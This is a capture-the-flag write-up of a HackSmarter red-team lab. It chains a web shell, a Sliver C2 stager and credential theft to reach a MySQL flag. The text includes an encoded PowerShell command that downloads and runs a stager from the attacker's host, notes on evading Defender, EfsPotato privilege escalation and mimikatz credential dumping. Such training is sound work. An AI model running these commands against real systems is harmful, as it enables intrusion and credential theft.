# [HackSmarter.org - Staged](https://www.hacksmarter.org/courses/5e8ff30a-d814-42c4-9b88-2f66f2592a8a/take)

![b9f87537ddf7a328b2124dab98443678.png](/resources/b9f87537ddf7a328b2124dab98443678.png)

## Table of Contents

- [Abstract](#abstract)
- [Scope and Objective](#scope-and-objective)
- [Enumeration](#enumeration)
- [Initial Access on Web Server with Sliver implant](#initial-access-on-web-server-with-sliver-implant)
- [Obtaining b.morgan's password from Edge saved password](#obtaining-bmorgans-password-from-edge-saved-password)
- [Obtaining p.richardson's password from autologon registry key](#obtaining-prichardsons-password-from-autologon-registry-key)
- [Privilege Escalation on Web Server with SeImpersonatePrivilege](#privilege-escalation-on-web-server-with-seimpersonateprivilege)
- [Tunneling via Sliver and connecting to MySQL service on MySQL Server](#tunneling-via-sliver-and-connecting-to-mysql-service-on-mysql-server)

***
## Abstract 
Staged is a chained labs combining with 2 public-faceing Windows Web Server as initial access point and Linux MySQL database server where we are provided with a usable web shell already uploaded and working on Windows Defender enabled Windows Web Server and our mission is to exfiltrate the flag from Linux MySQL database server

To gain an interactive shell on Windows Web server, I created nim compiled sliver C2 shellcode stager taught in [Sliver C2](https://www.hacksmarter.org/courses/dcb55e7c-6205-4ad2-92b7-7c8fcd71faad/take/) course to run shellcode on the machine without any detection, from then I can use sliver armory to extract "b.morgan"'s password from Microsoft Edge's saved credential and "p.richardson"'s password from Autologon registry key

From then I start socks5 tunnel on Sliver and use "p.richardson" credential to connec to MySQL database on database server and finally loot root flag

## Scope and Objective
You are a member of the Hack Smarter Red Team and have been assigned to perform a black-box penetration test against a client's critical infrastructure. The scope is strictly limited to the following hostnames:
- **web.hacksmarter**: Public-facing Windows Web Server (Initial Access Point). Windows Defender is enabled.
- **sqlsrv.hacksmarter**: Internal Linux MySQL Database Server.

The exercise is considered complete upon successfully retrieval the final flag from `sqlsrv.hacksmarter`

Any activity outside of these two hosts or their associated network interfaces is strictly prohibited.

**Lab Starting Point**
During the beginning of the engagement, another operator exploited a file upload vulnerability, and they have provided you with a web shell.

`http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami`

## Enumeration

I will start with rustscan since it is faster than nmap and VPN connection can tolerate this much of traffic unlike HTB. (I could not use rustscan could not be used on HTB) and we can see that website is running on both 80 and 443, we also have RDP and WinRM enabled as well
```
rustscan -a web.hacksmarter -- -A
```
![b3ad7f5d4ffacca28a86d42e1a452d5e.png](/resources/b3ad7f5d4ffacca28a86d42e1a452d5e.png)

Nmap was able to retrieve the banner of the website which we can see that it is using XAMPP to host so thats why we have both port 80 and 443

![8291fcc557e910075983de3d5e2443e4.png](/resources/8291fcc557e910075983de3d5e2443e4.png)

On the other hand, I only have port 22 opened on Linux MySQL database server which indicates that we need to do some port forwarding / pivot to be able to connect to MySQL service that running on port 3306 by default

```
rustscan -a sqlsrv.hacksmarter -- -A
```
![5f1c4033f82524acfe13f1a12cc4282a.png](/resources/5f1c4033f82524acfe13f1a12cc4282a.png)

To check if the webshell is usable, I simply run `whoami` and we can see that we have "j.smith" running XAMPP to host the website so we will obtain the reverse shell as this user

![f6372fc84c9cabaf99ad40f074f45f52.png](/resources/f6372fc84c9cabaf99ad40f074f45f52.png)

I will check for special privilege next which we can see that this user has "SeImpersonatePrivilege" so after obtaining a shell, we can find a way to become SYSTEM user with this privilege but pre-compiled executable like PrintSpoofer and GodPotato should already well fingerprinted by Windows Defender

```
curl --path-as-is 'http://web.hacksmarter/hacksmarter/shell.php?cmd=whoami%20/priv'
```
![4d159d29d9225721a75f8dad49266544.png](/resources/4d159d29d9225721a75f8dad49266544.png)

## Initial Access on Web Server with Sliver implant

I will use the nim stager provided in [Sliver C2](https://www.hacksmarter.org/courses/dcb55e7c-6205-4ad2-92b7-7c8fcd71faad/take/) course which will fetch sliver shellcode over HTTP and execute in the memory

![5c145fbd0fc830cf29899cb508674711.png](/resources/5c145fbd0fc830cf29899cb508674711.png)

Next, I will create a sliver shellcode that will call back to my IP address over mTLS on port 443

```
generate --mtls $IP:443 --os windows --arch amd64 --format shellcode --save sc.bin
```
![40c4208ddd0ace57940e6faa4f077613.png](/resources/40c4208ddd0ace57940e6faa4f077613.png)

Once a shellcode is saved, we can now start our HTTP server and mTLS listener

```
mtls --lport 443
python3 -m http.server 80
```
![9540266bfd71815668bc4e7bed7b3e47.png](/resources/9540266bfd71815668bc4e7bed7b3e47.png)

Next, I will convert my command to fetch and execute stager to base64 so I can use this command on the webshell directly

```
$stager='IWR http://10.200.24.236/stager.exe -OutFile $env:TEMP\stager.exe; Start-Process $env:TEMP\stager.exe'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($stager)
$encoded = [Convert]::ToBase64String($bytes)
$encoded
```
![27dc82056ff65f3b8395489ef6633304.png](/resources/27dc82056ff65f3b8395489ef6633304.png)

Run it, wait for a few moment and we should be able to have a new session pop up from Windows Web Server

```
curl --path-as-is 'http://web.hacksmarter/hacksmarter/shell.php?cmd=powershell%20-e%20SQBXAFIAIABoAHQAdABwADoALwAvADEAMAAuADIAMAAwAC4AMgA0AC4AMgAzADYALwBzAHQAYQBnAGUAcgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAJABlAG4AdgA6AFQARQBNAFAAXABzAHQAYQBnAGUAcgAuAGUAeABlADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAJABlAG4AdgA6AFQARQBNAFAAXABzAHQAYQBnAGUAcgAuAGUAeABlAA=='
```
![2cea51ada5899cf37f4b7841c7bfbe8b.png](/resources/2cea51ada5899cf37f4b7841c7bfbe8b.png)

## Obtaining b.morgan's password from Edge saved password

Sliver have many armory that can be used and most of them will execute in the memory which I start with basic looting on the web browser where I discovered that there is credential of "b.morgan" saved on Microsoft Edge 

```
sharpchrome logins /browser:edge
```
![e94d173d50844511f4dd5a5698467071.png](/resources/e94d173d50844511f4dd5a5698467071.png)

## Obtaining p.richardson's password from autologon registry key

I run sharpup next where I discovered a password of "p.richardson" from Autologon registry (`^^CThacker66`)

```
sharpup audit
```
![a2600872c712f41eb371b3f617715a67.png](/resources/a2600872c712f41eb371b3f617715a67.png)

## Privilege Escalation on Web Server with SeImpersonatePrivilege

I want to see if I can loot more password using mimikatz so I try to run `getsystem` but we could not do that, probably because `getsystem` of Sliver is working differently than meterpreter

![4e0ce2c46ae7d7874fc7805d611ccb95.png](/resources/4e0ce2c46ae7d7874fc7805d611ccb95.png)
![d466cb9f2912b0cdbf6aea0f0091e19c.png](/resources/d466cb9f2912b0cdbf6aea0f0091e19c.png)

I will upload C# script [EfsPotato](https://github.com/zcgonvh/EfsPotato) to the machine and compile it since it is not detected and fingerprinted by Windows Defender

```
upload /home/kali/Desktop/hacksmarter/staged/EfsPotato/EfsPotato.cs
execute cmd.exe -- /c "C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe /platform:x86 /out:C:\xampp\htdocs\hacksmarter\uploads\EfsPotato.exe C:\xampp\htdocs\hacksmarter\uploads\EfsPotato.cs"
```
![f312eabd4a570a87dd08c85ffaa3dcb0.png](/resources/f312eabd4a570a87dd08c85ffaa3dcb0.png)

Now we can use it to run our stager again, after a few moment a new session under SYSTEM privilege should pop up for us to use

```
execute EfsPotato.exe "cmd.exe /C C:\Users\j.smith\AppData\Local\Temp\stager.exe"
```
![1199082e3f383ccb1e0bdc4ac7a82d78.png](/resources/1199082e3f383ccb1e0bdc4ac7a82d78.png)

Now we can use mimikatz armory to loot logon passwords and since there is Autologon registry key then it is obvious that we will see the hash of "p.richardson" in the memory as well

```
mimikatz -- sekurlsa::logonpasswords
```
![895904825938a5c5a71c51fbaabeaf9f.png](/resources/895904825938a5c5a71c51fbaabeaf9f.png)
![aa9a7a974bcc7af864969ad8a97ed9cf.png](/resources/aa9a7a974bcc7af864969ad8a97ed9cf.png)

## Tunneling via Sliver and connecting to MySQL service on MySQL Server

So far, we obtain 2 different cleartext password from 2 users and "p.richardson" might be the high valued target so his credential could be used with MySQL service, knowing this I start socks5 tunnel right away

```
socks5 start
```
![9b458279db2c59420de7eef18790edcc.png](/resources/9b458279db2c59420de7eef18790edcc.png)

Sliver will use port 1081 by default so we need to modify [ProxyList] in `/etc/proxychains.conf` to correspond with this

![0f6f7f66722f667a9cc5392de3b876da.png](/resources/0f6f7f66722f667a9cc5392de3b876da.png)

Next, I tried to run nmap to scan port 3306 on Linux MySQL database server and it does not look good for me

![a607a24e62d11c770784934da329f67e.png](/resources/a607a24e62d11c770784934da329f67e.png)

I always have this problem with nmap so I need manual check via netcat and we can see that proxychains works well and now we should be able to connect to MySQL on Linux server

![6a466905f1c7d44fd4f9733387efd503.png](/resources/6a466905f1c7d44fd4f9733387efd503.png)

I will use "p.richardson" credential to connect first and look like we are in!

```
proxychains -q mysql -u p.richardson -h sqlsrv.hacksmarter -p --skip-ssl
```
![910e1306d8bb7330b330ea4954a9aee3.png](/resources/910e1306d8bb7330b330ea4954a9aee3.png)

A final flag is in "final_config" table under "hacksmarter_db" database

```
show databases;
use hacksmarter_db
show tables;
select * from final_config;
```
![b5b63b24493e1e2059b9d3bf0d0aa6a4.png](/resources/b5b63b24493e1e2059b9d3bf0d0aa6a4.png)

and we are done :D
***
